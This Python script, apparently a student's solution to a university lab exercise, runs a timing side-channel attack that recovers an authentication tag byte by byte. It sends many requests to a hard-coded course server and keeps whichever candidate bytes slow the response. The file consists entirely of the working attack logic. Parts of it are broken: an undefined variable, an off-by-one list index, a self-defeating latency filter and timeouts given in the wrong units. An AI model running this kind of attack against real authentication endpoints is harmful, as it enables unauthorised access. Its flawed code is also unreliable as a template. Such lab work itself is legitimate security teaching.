import requests
from requests.exceptions import ConnectionError, Timeout
import time
import concurrent.futures
from statistics import median, fmean
from typing import Union

#
#   Globals
#

DEBUG: bool = True
CSV: bool = True
BASE_URL: str = "http://dart.cse.kau.se:12345/auth/"
HTTP_MAX_RETRIES: int = 32
HTTP_RETRY_SLEEP_BASE: float = 0.5
HTTP_RETRY_SLEEP_FACTOR: float = 0.5
HTTP_LATENCY_TIMOUT_FACTOR: float = 1.5
HTTP_LATENCY_THRESHOLD_FACTOR: float = 0.95
TEST_SAMPLE_SIZE: int = 50
CONCURRENT_WORKERS: int = 4

# ANSI escape codes for text colors
ANSI_RESET = "\033[0m"
ANSI_BLACK = "\033[30m"
ANSI_RED = "\033[31m"
ANSI_GREEN = "\033[32m"
ANSI_YELLOW = "\033[33m"
ANSI_BLUE = "\033[34m"
ANSI_MAGENTA = "\033[35m"
ANSI_CYAN = "\033[36m"
ANSI_WHITE = "\033[37m"

#
#   Classes
#

class TestResult:
    url: str
    status_code: int
    text: str
    elapsed_time: float

    def __init__(self, url, status_code, text, elapsed_time):
        self.url = url
        self.status_code = status_code
        self.text = text
        self.elapsed_time = elapsed_time

class Auth:
    url: str
    user: str
    delay: float
    latency: float
    tag: list[int]
    tag_max_length: int
    elapsed_time_threshold: float
    sample_size: int
    test_results: list[TestResult]

    def __init__(self, user: str, delay: float, tag: list[int], latency: float):
        self.test_results = []
        self.tag_max_length = 32
        self.sample_size = TEST_SAMPLE_SIZE
        self.latency = latency

        self.user = user
        self.delay = delay
        self.tag = tag

        tag_as_string = self.tag_as_string()
        self.url = f"{BASE_URL}{int(delay)}/{user}/{tag_as_string}"

        self._run()

        if (delay != 0):
            if CSV and not DEBUG:
                print(f"{self._tag_length()},{tag_as_string},{'{:.2f}'.format(self.elapsed_time_mean())},{'{:.2f}'.format(self.elapsed_time_median())},{'{:.2f}'.format(self._threshold())},{self.delay},{TEST_SAMPLE_SIZE},{'{:.2f}'.format(HTTP_LATENCY)},{self.tag_ok()}")
            elif DEBUG:
                color = ANSI_GREEN if self.tag_ok() else ANSI_RESET
                print(f'''{color}0x{tag_as_string}
    Mean/Median time:    {"{:.2f}".format(self.elapsed_time_mean())} / {"{:.2f}".format(self.elapsed_time_median())}
    Threshold (latency): {"{:.2f}".format(self._threshold())} ({"{:.2f}".format(self.latency)})
    Delay (iteration):   {"{:.2f}".format(self.delay)} ({self._tag_length()} out of {self.tag_max_length}){ANSI_RESET}''')

    # If auth is sucessfull return True
    def ok(self) -> bool:
        return any(r.status_code == 200 for r in self.test_results)
    
    def tag_ok(self) -> bool:
        return self.elapsed_time_mean() > self._threshold()
    
    def _threshold(self) -> float:
        return self.delay * float(self._tag_length()) + (self.latency * HTTP_LATENCY_THRESHOLD_FACTOR)
    
    def _tag_length(self) -> int:
        return len([item for item in self.tag if isinstance(item, int)])
    
    def tag_as_string(self) -> str:
        string = ""
        # represent as string
        for hex_value in self.tag:
            if not isinstance(hex_value, int):
                hex_value = 0
            hex_value = hex(hex_value) # convert
            hex_value = hex_value[2:] # remove the two first characters which are "0x"
            hex_value = pad_string_with_zero(hex_value, 2)
            string += hex_value
        # pad string and return
        return pad_string_with_zero(string, self.tag_max_length)

    def elapsed_time_mean(self) -> float:
        if self.test_results:
            return fmean([item.elapsed_time for item in self.test_results])
        else:
            return 0.0
        
    def elapsed_time_median(self) -> float:
        if self.test_results:
            return median([item.elapsed_time for item in self.test_results])
        else:
            return 0.0

    def _run(self) -> None:
        for _ in range(self.sample_size):
            result = self._request()
            if result:
                self.test_results.append(result)
    
    def _request(self) -> Union[TestResult, None]:
        timeout: float = self._threshold() + (self.latency * HTTP_LATENCY_TIMOUT_FACTOR)
        if timeout == 0.0:
            timeout = 1337.0
        retried: int = 0

        while retried < HTTP_MAX_RETRIES:
            retry_sleep_time: float = HTTP_RETRY_SLEEP_BASE + (HTTP_RETRY_SLEEP_FACTOR * retried)
            try:
                start_time = time.time()
                response = requests.get(self.url, timeout=timeout)
                end_time = time.time()
                elapsed_time = (end_time - start_time) * 1000
                return TestResult(self.url, response.status_code, response.text, elapsed_time)
            except ConnectionError as e:
                if DEBUG:
                    print(f"Connection failed {e}")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"Max retries of {HTTP_MAX_RETRIES} exceeded!")
                    break
            except Timeout as e:
                print(f"Timeout of {timeout} ms exceeded.")
                retried += 1
                if retried < HTTP_MAX_RETRIES:
                    if DEBUG:
                        print(f"Retrying in {retry_sleep_time} ms")
                    time.sleep(retry_sleep_time)
                else:
                    print(f"Max retries of {HTTP_MAX_RETRIES} exceeded!")
                    break
        return None

#
#   Static functions
#

def pad_string_with_zero(input_str, target_length):
    while len(input_str) < target_length:
        input_str += '0'
    return input_str

def full_byte_range_with_prefix(prefix: list[int]) -> list[list[int]]:
    list_of_list = []
    for x in range(256):
        p = prefix.copy()
        p.append(x)
        list_of_list.append(p)
    return list_of_list

def run(user: str, delay: float, tag_prefix: list[int], latency: float) -> str:
    tag_prefix_ok: list[Auth] = []

    with concurrent.futures.ThreadPoolExecutor(CONCURRENT_WORKERS) as executor:
        uncompleted_futures = []
        for tag in full_byte_range_with_prefix(tag_prefix):
            uncompleted_futures.append(executor.submit(Auth, user, delay, tag, latency))
        
        for completed_futures in concurrent.futures.as_completed(uncompleted_futures):
            auth_attempt: Auth = completed_futures.result()
            if auth_attempt.ok():
                print(auth_attempt)
                # Completed got status 200 return url
                return auth_attempt.url
            elif auth_attempt.tag_ok():
                # Working tag prefix
                tag_prefix_ok.append(auth_attempt)

    # Set new http latency
    latency = fmean([item.elapsed_time_mean() - (item.delay / item._tag_length()) for item in tag_prefix_ok if not item.ok() and not item.tag_ok()])

    if len(tag_prefix_ok) == 1:
        # Continue with next tag prefix
        return run(user, delay, tag_prefix_ok[1].tag, latency)
    elif len(tag_prefix_ok) > 1:
        # Too many ok, run again
        return run(user, delay, tag_prefix, latency)
    else:
        # Nothing ok, run again
        return run(user, delay, tag_prefix, latency)
#
#   Main
#

if __name__ == "__main__":
    user: str = "oscaande104"
    delay: float = float(100)
    
    latency = Auth(user, 0, [0x0], 1337).elapsed_time_mean()
    if latency > 0:
        if CSV and not DEBUG:
            print(f"tag iteration,tag,mean,median,threshold,delay,sample size,latency,tag ok")

        if delay > 0:
            print(f"Done!\nurl={run(user, delay, [], latency)}")
        else:
            print("Delay has to be larger than 0.")
    else:
        print("Failed to get base HTTP latency to server, maybe there is not network connection.")